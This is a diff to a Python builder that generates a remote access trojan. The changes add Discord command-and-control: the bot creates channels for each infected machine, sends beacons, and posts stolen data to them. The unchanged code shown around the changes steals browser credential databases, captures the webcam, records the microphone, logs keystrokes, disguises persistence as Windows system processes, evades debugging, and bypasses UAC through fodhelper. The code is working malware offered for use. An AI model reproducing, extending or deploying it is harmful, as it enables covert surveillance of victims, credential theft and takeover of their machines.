@@ -20,12 +20,12 @@ except ImportError:
         prompt('\n  \033[90mPress Enter to continue...\033[0m'); input()
 
 RAT_STUB = r'''
-import os, sys, time, json, base64, subprocess, urllib.request, threading, platform, shutil, ctypes, struct, io, ssl, socket, hashlib
+import os, sys, time, json, base64, subprocess, urllib.request, urllib.error, threading, platform, shutil, ctypes, struct, io, ssl, socket, hashlib, uuid
 from datetime import datetime
 
 WEBHOOK = "{webhook}"
 TOKEN = "{token}"
-CHANNEL = "{channel}"
+GUILD = "{guild}"
 PERSIST = {persist}
 STEALTH = {stealth}
 DEBUG = {debug}
@@ -37,6 +37,9 @@ DBG_LOCK = threading.Lock()
 PERSIST_NAMES = ["csrss", "svchost", "RuntimeBroker", "SearchIndexer", "conhost"]
 KEYLOG_ACTIVE = False
 KEYLOG_DATA = []
+CMDS_CHANNEL = None
+STATUS_CHANNEL = None
+PC_NAME = None
 
 def dprint(msg):
     if DEBUG:
@@ -114,6 +117,147 @@ def anti_debug():
             return True
     except: pass
     return False
+
+def get_pc_id():
+    global PC_NAME
+    id_file = os.path.join(os.getenv("APPDATA", "."), "rat_id.txt")
+    hostname = platform.node() or "unknown"
+    try:
+        if os.path.isfile(id_file):
+            with open(id_file, "r") as f:
+                saved = f.read().strip()
+            if saved:
+                PC_NAME = f"{{hostname}}_{{saved[:8]}}"
+                dprint(f"Loaded PC ID: {{PC_NAME}}")
+                return PC_NAME
+    except: pass
+    uid = uuid.uuid4().hex[:8]
+    try:
+        with open(id_file, "w") as f:
+            f.write(uid)
+    except: pass
+    PC_NAME = f"{{hostname}}_{{uid}}"
+    dprint(f"Generated PC ID: {{PC_NAME}}")
+    return PC_NAME
+
+def discord_api(method, path, data=None, content_type=None):
+    url = f"https://discord.com/api/v10{{path}}"
+    headers = {{
+        "Authorization": f"Bot {{TOKEN}}",
+        "User-Agent": "RAT/1.0"
+    }}
+    body = None
+    if data is not None:
+        body = json.dumps(data).encode("utf-8")
+        headers["Content-Type"] = "application/json"
+    elif content_type:
+        headers["Content-Type"] = content_type
+    req = urllib.request.Request(url, data=body, headers=headers, method=method)
+    try:
+        resp = urllib.request.urlopen(req, timeout=15)
+        raw = resp.read().decode("utf-8")
+        return json.loads(raw) if raw else {{}}
+    except urllib.error.HTTPError as e:
+        err_body = e.read().decode("utf-8", errors="replace")[:300]
+        dprint(f"API error {{e.code}}: {{err_body}}")
+        return {{"error": e.code, "detail": err_body}}
+    except Exception as e:
+        dprint(f"API exception: {{e}}")
+        return {{"error": str(e)}}
+
+def send_webhook(text):
+    data = {{"content": str(text)[:2000]}}
+    body = json.dumps(data).encode("utf-8")
+    req = urllib.request.Request(WEBHOOK, data=body, headers={{"Content-Type": "application/json"}}, method="POST")
+    try:
+        urllib.request.urlopen(req, timeout=10)
+    except: pass
+
+def send_file(filename, file_data, channel_id=None):
+    target = channel_id or CMDS_CHANNEL
+    if not target:
+        target = "webhook"
+    if target == "webhook":
+        boundary = base64.b16encode(os.urandom(16)).decode()
+        body = b""
+        body += f"--{{boundary}}\r\n".encode()
+        body += f'Content-Disposition: form-data; name="file"; filename="{{filename}}"\r\n'.encode()
+        body += b"Content-Type: application/octet-stream\r\n\r\n"
+        body += file_data
+        body += f"\r\n--{{boundary}}--\r\n".encode()
+        req = urllib.request.Request(WEBHOOK, data=body, headers={{
+            "Content-Type": f"multipart/form-data; boundary={{boundary}}"
+        }}, method="POST")
+        try:
+            urllib.request.urlopen(req, timeout=30)
+        except: pass
+    else:
+        boundary = base64.b16encode(os.urandom(16)).decode()
+        payload_json = json.dumps({{"content": f"[FILE] {{filename}}"}})
+        body = b""
+        body += f"--{{boundary}}\r\n".encode()
+        body += b"Content-Disposition: form-data; name=\"payload_json\"\r\nContent-Type: application/json\r\n\r\n"
+        body += payload_json.encode("utf-8")
+        body += f"\r\n--{{boundary}}\r\n".encode()
+        body += f'Content-Disposition: form-data; name="file"; filename="{{filename}}"\r\n'.encode()
+        body += b"Content-Type: application/octet-stream\r\n\r\n"
+        body += file_data
+        body += f"\r\n--{{boundary}}--\r\n".encode()
+        url = f"https://discord.com/api/v10/channels/{{target}}/messages"
+        headers = {{"Authorization": f"Bot {{TOKEN}}"}}
+        req = urllib.request.Request(url, data=body, headers=headers, method="POST")
+        req.add_header("Content-Type", f"multipart/form-data; boundary={{boundary}}")
+        try:
+            urllib.request.urlopen(req, timeout=30)
+        except: pass
+
+def setup_channels():
+    global CMDS_CHANNEL, STATUS_CHANNEL
+    pc = get_pc_id()
+    dprint(f"Setting up channels for {{pc}}")
+    channels = discord_api("GET", f"/guilds/{{GUILD}}/channels")
+    if "error" in channels:
+        dprint(f"Failed to fetch channels: {{channels}}")
+        return False
+    cat_id = None
+    cmds_id = None
+    status_id = None
+    for ch in channels:
+        name = ch.get("name", "")
+        if ch.get("type") == 4 and name == pc:
+            cat_id = ch["id"]
+        elif ch.get("type") == 0 and name == "cmds" and cat_id and ch.get("parent_id") == cat_id:
+            cmds_id = ch["id"]
+        elif ch.get("type") == 0 and name == "status" and cat_id and ch.get("parent_id") == cat_id:
+            status_id = ch["id"]
+    if not cat_id:
+        dprint("Creating category...")
+        result = discord_api("POST", f"/guilds/{{GUILD}}/channels", {{"name": pc, "type": 4}})
+        cat_id = result.get("id")
+        if not cat_id:
+            dprint(f"Failed to create category: {{result}}")
+            return False
+        dprint(f"Category created: {{cat_id}}")
+    if not cmds_id:
+        dprint("Creating cmds channel...")
+        result = discord_api("POST", f"/guilds/{{GUILD}}/channels", {{"name": "cmds", "type": 0, "parent_id": cat_id}})
+        cmds_id = result.get("id")
+        if not cmds_id:
+            dprint(f"Failed to create cmds: {{result}}")
+            return False
+        dprint(f"cmds channel created: {{cmds_id}}")
+    if not status_id:
+        dprint("Creating status channel...")
+        result = discord_api("POST", f"/guilds/{{GUILD}}/channels", {{"name": "status", "type": 0, "parent_id": cat_id}})
+        status_id = result.get("id")
+        if not status_id:
+            dprint(f"Failed to create status: {{result}}")
+            return False
+        dprint(f"status channel created: {{status_id}}")
+    CMDS_CHANNEL = str(cmds_id)
+    STATUS_CHANNEL = str(status_id)
+    dprint(f"Ready: cmds={{CMDS_CHANNEL}} status={{STATUS_CHANNEL}}")
+    return True
 
 def get_persist_name():
     custom = "{{PERSIST_NAME}}"
@@ -295,25 +439,25 @@ def webcam_capture():
             "Add-Type -AssemblyName System.Windows.Forms;"
             "Add-Type -TypeDefinition '"
             "using System;using System.Runtime.InteropServices;using System.Drawing;using System.Drawing.Imaging;"
-            "public class CamCapture{"
+            "public class CamCapture{{"
             "[DllImport(\"user32.dll\")]public static extern IntPtr GetDesktopWindow();"
             "[DllImport(\"avicap32.dll\",CharSet=CharSet.Unicode)]public static extern IntPtr capCreateCaptureWindowW("
             "string lpszWindowName,int dwStyle,int x,int y,int nWidth,int nHeight,IntPtr hWndParent,int nID);"
             "[DllImport(\"user32.dll\")]public static extern bool SendMessage(IntPtr hWnd,int Msg,int wParam,int lParam);"
             "[DllImport(\"user32.dll\")]public static extern bool DestroyWindow(IntPtr hWnd);"
-            "public static bool Capture(string path){"
+            "public static bool Capture(string path){{"
             "IntPtr h=capCreateCaptureWindowW(\"cap\",0x40000000|0x10000000,0,0,640,480,GetDesktopWindow(),0);"
             "if(h==IntPtr.Zero)return false;"
             "SendMessage(h,0x40a,0,0);System.Threading.Thread.Sleep(1000);"
             "SendMessage(h,0x41e,0,0);System.Threading.Thread.Sleep(500);"
             "IntPtr bmp=IntPtr.Zero;"
             "SendMessage(h,0x419,0,ref bmp);"
-            "if(bmp==IntPtr.Zero){DestroyWindow(h);return false;}"
+            "if(bmp==IntPtr.Zero){{DestroyWindow(h);return false;}}"
             "Image img=Image.FromHbitmap(bmp);img.Save(path,ImageFormat.Jpeg);img.Dispose();"
-            "DestroyWindow(h);return true;}"
-            "}';"
+            "DestroyWindow(h);return true;}}"
+            "}}';"
             "$cap=[CamCapture]::new();"
-            "if($cap.Capture('" + tmp.replace("\\", "\\\\") + "')){exit 0}else{exit 1}"
+            "if($cap.Capture('" + tmp.replace("\\", "\\\\") + "')){{exit 0}}else{{exit 1}}"
         )
         r = subprocess.run(
             ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps],
@@ -339,7 +483,7 @@ def audio_record(duration=5):
             "$w=New-Object System.IO.BinaryWriter([System.IO.File]::Create('" + tmp.replace("\\", "\\\\") + "'));"
             "Add-Type -TypeDefinition '"
             "using System;using System.Runtime.InteropServices;"
-            "public class AudioIn{"
+            "public class AudioIn{{"
             "[DllImport(\"winmm.dll\")]public static extern int waveInOpen(out IntPtr h,int fmt,IntPtr fmtex,IntPtr c,IntPtr u,int f);"
             "[DllImport(\"winmm.dll\")]public static extern int waveInStart(IntPtr h);"
             "[DllImport(\"winmm.dll\")]public static extern int waveInStop(IntPtr h);"
@@ -348,17 +492,17 @@ def audio_record(duration=5):
             "[DllImport(\"winmm.dll\")]public static extern int waveInUnprepareHeader(IntPtr h,IntPtr wh,int s);"
             "[DllImport(\"winmm.dll\")]public static extern int waveInAddBuffer(IntPtr h,IntPtr wh,int s);"
             "[DllImport(\"winmm.dll\")]public static extern int waveInReset(IntPtr h);"
-            "[StructLayout(LayoutKind.Sequential)]public struct WAVEFORMATEX{public short wFormatTag;public short nChannels;"
-            "public int nSamplesPerSec;public int nAvgBytesPerSec;public short nBlockAlign;public short wBitsPerSample;public short cbSize;}"
-            "[StructLayout(LayoutKind.Sequential)]public struct WAVEHDR{public IntPtr lpData;public int dwBufferLength;"
-            "public int dwBytesRecorded;public IntPtr dwUser;public int dwFlags;public int dwLoops;public IntPtr lpNext;public int reserved;}"
-            "}';"
+            "[StructLayout(LayoutKind.Sequential)]public struct WAVEFORMATEX{{public short wFormatTag;public short nChannels;"
+            "public int nSamplesPerSec;public int nAvgBytesPerSec;public short nBlockAlign;public short wBitsPerSample;public short cbSize;}}"
+            "[StructLayout(LayoutKind.Sequential)]public struct WAVEHDR{{public IntPtr lpData;public int dwBufferLength;"
+            "public int dwBytesRecorded;public IntPtr dwUser;public int dwFlags;public int dwLoops;public IntPtr lpNext;public int reserved;}}"
+            "}}';"
             "$fmt=New-Object AudioIn+WAVEFORMATEX;"
             "$fmt.wFormatTag=1;$fmt.nChannels=1;$fmt.nSamplesPerSec=22050;"
             "$fmt.nAvgBytesPerSec=44100;$fmt.nBlockAlign=2;$fmt.wBitsPerSample=16;$fmt.cbSize=0;"
             "$h=[IntPtr]::Zero;"
             "$r=[AudioIn]::waveInOpen([ref]$h,1,[ref]$fmt,[IntPtr]::Zero,[IntPtr]::Zero,0);"
-            "if($r -ne 0){$w.Close();exit 1}"
+            "if($r -ne 0){{$w.Close();exit 1}}"
             "$hdr=New-Object AudioIn+WAVEHDR;"
             "$hdr.lpData=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(4096);"
             "$hdr.dwBufferLength=4096;"
@@ -476,7 +620,7 @@ def steal_browser():
                                 try:
                                     shutil.copy2(src, dst)
                                     with open(dst, 'rb') as fh:
-                                        send_file(f"{{name.lower()}}_{{f}}_{{db}}.db", fh.read())
+                                        send_file(f"{{name.lower()}}_{{f}}_{{db}}.db", fh.read(), CMDS_CHANNEL)
                                     os.remove(dst)
                                 except: pass
         if os.path.isdir(firefox_path):
@@ -491,7 +635,7 @@ def steal_browser():
                             try:
                                 shutil.copy2(src, dst)
                                 with open(dst, 'rb') as fh:
-                                    send_file(f"ff_{{prof}}_{{db}}", fh.read())
+                                    send_file(f"ff_{{prof}}_{{db}}", fh.read(), CMDS_CHANNEL)
                                 os.remove(dst)
                             except: pass
         return "\\n".join(results) if results else "No browsers found"
@@ -504,12 +648,12 @@ def uac_bypass():
         method = "fodhelper"
         reg_path = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\fodhelper.exe"
         ps = (
-            f"New-Item -Path '{reg_path}' -Force|Out-Null;"
-            f"Set-ItemProperty -Path '{reg_path}' -Name 'Debugger' -Value '{exe}';"
+            f"New-Item -Path '{{reg_path}}' -Force|Out-Null;"
+            f"Set-ItemProperty -Path '{{reg_path}}' -Name 'Debugger' -Value '{{exe}}';"
             "Start-Process fodhelper.exe -WindowStyle Hidden;"
             "Start-Sleep 3;"
-            f"Remove-ItemProperty -Path '{reg_path}' -Name 'Debugger' -Force;"
-            f"Remove-Item -Path '{reg_path}' -Force"
+            f"Remove-ItemProperty -Path '{{reg_path}}' -Name 'Debugger' -Force;"
+            f"Remove-Item -Path '{{reg_path}}' -Force"
         )
         r = subprocess.run(["powershell", "-NoProfile", "-Command", ps],
                            capture_output=True, text=True, timeout=15)
@@ -556,7 +700,7 @@ def handle_command(cmd_text):
     elif cmd == "screenshot":
         data = take_screenshot()
         if data:
-            send_file("screenshot.bmp", data)
+            send_file("screenshot.bmp", data, CMDS_CHANNEL)
             return "Screenshot sent via webhook"
         return "Screenshot failed"
     elif cmd == "clipboard":
@@ -625,7 +769,7 @@ def handle_command(cmd_text):
     elif cmd == "download":
         if os.path.isfile(args):
             with open(args, 'rb') as f:
-                send_file(os.path.basename(args), f.read())
+                send_file(os.path.basename(args), f.read(), CMDS_CHANNEL)
             return f"Sent: {{args}}"
         return f"File not found: {{args}}"
     elif cmd == "upload":
@@ -633,7 +777,7 @@ def handle_command(cmd_text):
     elif cmd == "webcam":
         data = webcam_capture()
         if data:
-            send_file("webcam.jpg", data)
+            send_file("webcam.jpg", data, CMDS_CHANNEL)
             return "Webcam capture sent via webhook"
         return "Webcam capture failed (no camera or driver issue)"
     elif cmd == "audio":
@@ -642,7 +786,7 @@ def handle_command(cmd_text):
         if dur > 30: dur = 30
         data = audio_record(dur)
         if data:
-            send_file("audio.wav", data)
+            send_file("audio.wav", data, CMDS_CHANNEL)
             return f"Audio {{dur}}s recorded and sent via webhook"
         return "Audio recording failed (no mic or driver issue)"
     elif cmd == "keylog":
@@ -782,12 +926,12 @@ def main():
         except: pass
 
     info = get_info()
-    send_webhook(f"[RAT CONNECTED] {{info['user']}}@{{info['computer']}} | {{info['os']}} | IP: {{info['ip']}}")
+    pc = get_pc_id()
 
-    has_commands = bool(TOKEN and CHANNEL)
+    has_commands = bool(TOKEN and GUILD)
     if not has_commands:
-        dprint("No token/channel provided - webhook beacon only")
-        send_webhook("[RAT] Beacon-only mode (no command channel configured)")
+        dprint("No token/guild provided - webhook beacon only")
+        send_webhook(f"[RAT CONNECTED] {{info['user']}}@{{info['computer']}} | {{info['os']}} | IP: {{info['ip']}}")
         while True:
             jitter = random.uniform(SLEEP * 0.8, SLEEP * 1.2)
             time.sleep(jitter)
@@ -797,6 +941,7 @@ def main():
     last_msg_id = None
     connected = False
     reconnect_delay = 5
+    channels_ready = False
 
     while True:
         sock = None
@@ -834,7 +979,14 @@ def main():
 
             last_hb = time.time()
             connected = True
-            send_webhook(f"[RAT ONLINE] {{info['user']}}@{{info['computer']}} | Commands active via gateway")
+
+            if not channels_ready:
+                if setup_channels():
+                    channels_ready = True
+                    send_webhook(f"[RAT ONLINE] {{pc}} | {{info['user']}}@{{info['computer']}} | {{info['os']}} | IP: {{info['ip']}}")
+                    discord_api("POST", f"/channels/{{STATUS_CHANNEL}}/messages", {{"content": f"[BEACON] {{pc}} online | {{info['user']}}@{{info['computer']}} | {{info['os']}}"}})
+                else:
+                    dprint("Channel setup failed - will retry next cycle")
 
             while True:
                 try:
@@ -845,7 +997,10 @@ def main():
                         try:
                             _ws_send(sock, json.dumps({{"op": 1, "d": seq}}))
                             last_hb = time.time()
-                            dprint("Heartbeat sent")
+                            if CMDS_CHANNEL:
+                                try:
+                                    discord_api("POST", f"/channels/{{STATUS_CHANNEL}}/messages", {{"content": f"[BEACON] {{pc}} alive"}})
+                                except: pass
                         except Exception as e:
                             dprint(f"Heartbeat send failed: {{e}}")
                             break
@@ -876,7 +1031,8 @@ def main():
                         dprint(f"READY as {{user.get('username', '?')}}#{{user.get('discriminator', '0')}}")
                     elif t == "MESSAGE_CREATE":
                         msg = data.get("d", {{}})
-                        if str(msg.get("channel_id", "")) == CHANNEL:
+                        ch_id = str(msg.get("channel_id", ""))
+                        if CMDS_CHANNEL and ch_id == CMDS_CHANNEL:
                             content = msg.get("content", "")
                             author = msg.get("author", {{}})
                             if author.get("bot"):
@@ -886,7 +1042,7 @@ def main():
                                 if cmd:
                                     dprint(f"CMD from {{author.get('username','?')}}: {{cmd}}")
                                     result = handle_command(cmd)
-                                    send_webhook(f"```\n{{result}}\n```")
+                                    discord_api("POST", f"/channels/{{CMDS_CHANNEL}}/messages", {{"content": f"```\\n{{result}}\\n```"}})
                             elif content:
                                 dprint(f"MSG (no prefix): {{content[:60]}}")
                 elif op == 7:
@@ -986,13 +1142,13 @@ def run(kevbin=None):
             if not webhook or 'discord' not in webhook:
                 cprint("  \033[91m[X] Need valid webhook URL\033[0m"); pause(); continue
             token = prompt("  \033[96mBot Token (for commands): \033[0m").strip()
-            channel = prompt("  \033[96mChannel ID (for commands): \033[0m").strip()
-            if not token or not channel:
-                cprint("  \033[93m[!] No token/channel — beacon-only mode (no remote commands)\033[0m")
+            guild = prompt("  \033[96mGuild/Server ID (bot creates its own channels): \033[0m").strip()
+            if not token or not guild:
+                cprint("  \033[93m[!] No token/guild — beacon-only mode (no remote commands)\033[0m")
             if debug_mode:
                 _debug_print("WEBHOOK", webhook[:40] + "...")
                 _debug_print("TOKEN", token[:10] + "..." if token else "NONE")
-                _debug_print("CHANNEL", channel or "NONE")
+                _debug_print("GUILD", guild or "NONE")
             print()
             persist_opt = prompt("  \033[96mEnable persistence? (y/n, default n): \033[0m").strip().lower() == 'y'
             stealth = prompt("  \033[96mHide console? (y/n, default y): \033[0m").strip().lower() != 'n'
@@ -1021,7 +1177,7 @@ def run(kevbin=None):
             stub = RAT_STUB.format(
                 webhook=webhook,
                 token=token or "",
-                channel=channel or "",
+                guild=guild or "",
                 persist=str(persist_opt),
                 stealth=str(stealth),
                 debug=str(debug_mode),
@@ -1085,7 +1241,7 @@ def run(kevbin=None):
         elif choice == '3':
             clear()
             stub = RAT_STUB.format(webhook="WEBHOOK_URL", token="BOT_TOKEN",
-                                    channel="CHANNEL_ID", persist="False", stealth="True",
+                                    guild="GUILD_ID", persist="False", stealth="True",
                                     debug="False", sleep="5", prefix="!")
             print(stub)
         else:
